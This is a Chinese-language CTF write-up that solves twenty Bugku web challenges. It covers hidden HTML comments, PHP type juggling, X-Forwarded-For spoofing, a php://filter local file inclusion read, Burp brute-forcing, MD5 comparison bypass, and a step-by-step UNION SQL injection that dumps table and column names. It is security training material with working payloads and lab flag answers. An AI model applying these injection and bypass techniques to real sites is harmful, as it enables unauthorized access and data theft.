web部分的1-20题，其中本地包含这一题的网站打不开了。

# web2

> https://developer.mozilla.org/zh-CN/docs/Web/HTML

随便一个浏览器F12（Inspect Element）打开控制台，看到 HTML（超文本标记语言——HyperText Markup Language）注释中就存在flag。

HTML 注释格式 `<!-- 注释内容 -->`。

关键代码：

```html
<!--flag KEY{Web-2-bugKssNNikls9100}-->
```

![web2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web2.png)

# 计算器

> https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input/text#maxlength
>
> 用户可以输入`文本`输入框中的最大字符(参考UTF-16编码单元)数。 必须为整数，值等于0或者更大。 如果没有规定 `maxlength` ， 或者规定的值无效, 文本输入框就没有最大值。这个值也必须更大或者等于`minlength`的值。
>
> 如果文本框中的字符数大于 `maxlength` UTF-16编码单元，输入框的[验证](https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5/Constraint_validation)就会失败。 约束验证仅作用于用户输入值的时候。

输入框中只允许输入一个数字，查看源码发现`maxlength=1`，改成大一点的数字就好了（这里改成了5，其实只要能大于三位就好了这个题）。

关键代码：

```html
<input type="text" class="input" maxlength="1">
```

![计算器](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/随机数字运算.png)

# web基础$_GET

> https://stackoverflow.com/questions/14551194/how-are-parameters-sent-in-an-http-post-request
>
> In an HTTP **GET** request, parameters are sent as a **query string**:
>
> http://example.com/page**?parameter=value&also=another**

这是网页上的提示的 PHP 代码：

```php
$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

阅读 PHP 代码可知，构造 key 为 what，value 为 flag 的 get 请求就可以了。

直接使用浏览器构造即可，如下图所示：

![web基础$_GET](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web基础%24_GET.png)

# web基础$_POST

> https://stackoverflow.com/questions/14551194/how-are-parameters-sent-in-an-http-post-request
>
> The values are sent in the request body, in the format that the content type specifies.
>
> Usually the content type is `application/x-www-form-urlencoded`, so the request body uses the same format as the query string:
>
> ```
> parameter=value&also=another
> ```
>
> When you use a file upload in the form, you use the `multipart/form-data` encoding instead, which has a different format. It's more complicated, but you usually don't need to care what it looks like, so I won't show an example, but it can be good to know that it exists.

这是网页上的提示的 PHP 代码：

```php
$what=$_POST['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';
```

阅读 PHP 代码可知要构造 key 为 what，value 为 flag 的 post 请求，可以借助 Postman 工具构造 POST 请求

如下图所示：

![web基础$_POST](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web基础%24_POST.png)

也可以利用一下 python 的 requests 库来构造 post 请求

```python
import requests

payload = {'what': 'flag'}

r = requests.post("http://123.206.87.240:8002/post/", data=payload)

print(r.text)

# $what=$_POST['what'];<br>
# echo $what;<br>
# if($what=='flag')<br>
# echo 'flag{****}';<br>

# flagflag{bugku_get_ssseint67se}
```

# 矛盾

> https://www.php.net/manual/zh/function.is-numeric.php
>
> is_numeric — 检测变量是否为数字或数字字符串
>
> is_numeric ( [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) `$var` ) : bool
>
> 如果 `var` 是数字和数字字符串则返回 **TRUE**，否则返回 **FALSE**。

```php
$num=$_GET['num'];
if(!is_numeric($num))
{
echo $num;
if($num==1)
echo 'flag{**********}';
}
```

阅读代码可知，要发送一个 get 请求且 num=1，直接输入 1 是不行的，通过了解 is_numeric 的性质知输入1x 也可以通过 if 判断，然后下面的 == 进行转换成为 1，得到 flag。

如下图所示：

![矛盾](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%9F%9B%E7%9B%BE.png)

# web3

> https://www.zhihu.com/question/21390312

打开这个网站后，chrome 的弹框处理让它只弹出了一个框，查看控制台。

如下图所示：

![](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web3_2.png)

值得注意的是：这是**典型的 numeric character reference（NCR），不是「编码」。数字取值为目标字符的 Unicode code point；以「&#」开头的后接十进制数字，以「&#x」开头的后接十六进制数字**。

有两种方式可以解出这个题目：

第一种方式：

将源码中的注释部分（典型的 numeric character reference（NCR））直接放入html中，双击打开该html文件，即可看到flag。

如下图所示：

![](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web3.png)

第二种方式：

用 python 进行解析

```python
import html

print(html.unescape('&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;'))
# KEY{J2sa42ahJK-HS11III}
```

# 域名解析

题目提示：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag

如下图，修改本地hosts文件（最后一行添加上就可以）即可访问给出的地址

![域名解析](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.png)

# 你必须让他停下

打开浏览器，发现一直在闪动。

直接使用burpsuite进行抓包，第十张图片存在 flag。

![你必须让他停下](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B.png)

也可以借助 python 的 requests 库编码实现抓包：

```python
import requests

while True:
    url = "http://123.206.87.240:8002/web12/"
    r = requests.get(url)
    if "flag{" in r.text:
        print(r.text)
        break
```

# 变量1

参数 args 的值必须是由 [A-Za-z0-9] 字符集组成，并且将 args 值作为新的变量输出然后 eval 函数执行 根据题目的示，flag 值是一个变量，然而这个变量并不在我们访问的 php 文件中有定义，所以我们可以猜测 flag 可能是一个全局变量，php 的全局变量是 $GLOBALS，所以可以给参数 args 赋值为 GLOBALS，就可以将全局变量输出出来。

网页提示代码如下：

```php
flag In the variable ! <?php  
error_reporting(0);
include "flag1.php";
highlight_file(__file__);
if(isset($_GET['args'])){
    $args = $_GET['args'];
    if(!preg_match("/^\w+$/",$args)){
    // 这个正则表达式的意思是匹配任意 [A-Za-z0-9_] 的字符，就是任意大小写字母和0到9以及下划线组成
        die("args error!");
    }
    eval("var_dump($$args);");
}
?>
```

在浏览器下直接构造 GET 请求，key 为 args，value 为 GLOBALS

![变量1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%8F%98%E9%87%8F1.png)

# web5

打开浏览器控制台查看源码发现一个 div 元素被隐藏了（通过 CSS 设置的 display:none）。

```html
<div style="display:none;">
    ...
</div>
```

![web5](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web5_2.png)

将上图中的 JavaScript 代码组成的表达式 copy 到 console 控制台中按下回车键直接可以显示这一段 JavaScript 代码的最终结果。

![web5](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web5.png)

# 头等舱

使用burpsuite抓包，一抓就出来了。

![头等舱](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%B4%E7%AD%89%E8%88%B1.png)

也可以借助python的requests库

```python
import requests

url = "http://123.206.87.240:9009/hd.php"
r = requests.get(url)
d = r.headers
print(d)
```

# 网站被黑

使用御剑进行扫描，发现一个后门网站

![网站被黑1](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%91.png)

打开扫描出来的网站

![网站被黑2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%912.png)

使用burpsuite进行暴力破解，length不和其他一样的即为密码。

![网站被黑3](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%BD%91%E7%AB%99%E8%A2%AB%E9%BB%913.png)

# 管理员系统

> 参考 https://blog.csdn.net/xyx107/article/details/83017560 
>
> https://blog.csdn.net/Ruhe_king/article/details/82494834

在源码的注释中有 `dGVzdDEyMw==` 这一段，使用base64解码得到 `test123`，使用用户名 `admin`，密码 `test123`登录尝试得到下面的结果

![管理员系统2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F2.png)

提示中有**本地**，使用burpsuit抓包，修改XFF，【XFF：HTTP 请求头中的 X-Forwarded-For，用来表示 HTTP 请求端真实 IP】，抓包后，send to repeater，添加X-Forwarded-For：127.0.0.1，GO

![管理员系统](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F.png)

也可以借助python的requests库

```python
import requests

url = "http://123.206.31.85:1003/"
payload = {'user': 'admin', 'pass': 'test123'}
headers = {'X-Forwarded-For': '127.0.0.1'}
r = requests.post(url, data=payload, headers=headers)
print(r.text)

# <font style="color:#FF0000"><h3>The flag is: 85ff2ee4171396724bae20c0bd851f6b</h3><br\></font\>
```

# web4

提示我们看看源代码，将eval改成console.log,得到了下面`checkSubmit`函数，此题得解。

![web4](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/web4.png)

```javascript
var p1 =
  '%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62';
var p2 =
  '%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';
console.log(unescape(p1) + unescape('%35%34%61%61%32' + p2));

// 将eval改成console.log可以得到下面的代码，阅读代码可知，要输入67d709b2b54aa2aa648cf6e87a7114f1

function checkSubmit() {
  var a = document.getElementById("password");
  if ("undefined" != typeof a) {
    if ("67d709b2b54aa2aa648cf6e87a7114f1" == a.value) return !0;
    alert("Error");
    a.focus();
    return !1
  }
}
document.getElementById("levelQuest").onsubmit = checkSubmit;
```

# flag在index里

> 参考 https://blog.csdn.net/zpy1998zpy/article/details/80585443 

经典的本地文件包含漏洞+php伪协议的结合应用

点击后发现网址变成了http://123.206.87.240:8005/post/index.php?file=show.php

这里我们看到了file关键字，于是我们就想到了php://filter，把网址改为 http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php，得到一段base64编码，解码得到flag

![flag在index里](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/flag%E5%9C%A8index%E9%87%8C.png)

# 输入密码查看flag

提示输入五位的数字，直接使用burpsuite进行暴力破解

![输入密码查看flag](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag.png)

# 点击一百万次

阅读其中的JavaScript部分代码，使用hackbar或者控制台，可以将clicks设置为大于100万的数字，即可得出flag

![点击一百万次](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A1.png)

![点击一百万次2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E7%82%B9%E5%87%BB%E4%B8%80%E7%99%BE%E4%B8%87%E6%AC%A12.png)

# 备份是个好习惯

> 参考 https://blog.csdn.net/wyj____/article/details/90694603 
>
> https://blog.csdn.net/EustiaSora/article/details/79149411

使用御剑进行扫描

![备份是个好习惯](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF.png)

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

得到上面的代码后，构造相应的get请求，得到flag

![备份是个好习惯2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF2.png)

# 成绩单

首先分别输入1,2,3，均有输出，输入1’，没有回应，因此可以判断存在sql注入

分别输入

```sql
1' order by 1#
1' order by 2#
1' order by 3#
1' order by 4#
```

均有回应，但是当我们使用 `1' order by 5#` 时，没有回应，可以根据此判断字段数为4。

然后联合查询，输入 `1' union select 1,2,3,4#`，没有显示有用的东西，因为 id=1 被覆盖，输入 

```sql
5' union select 1,2,3,database()#
```

即设置一个新的id，要select的值会显示在表上（覆盖）。

现在我们得到了一个数据库的名字 `skctf_flag`，之后就进行爆表

```sql
id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# 
```

得到表名：fl4g,sc

接下来就要爆字段了

```sql
id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#
```

得到字段skctf_flag

最后就是查询数据了，通过使用：

```sql
id=-1' union select 1,2,3,skctf_flag from fl4g#
```

得到flag：BUGKU{Sql_INJECT0N_4813drd8hz4}
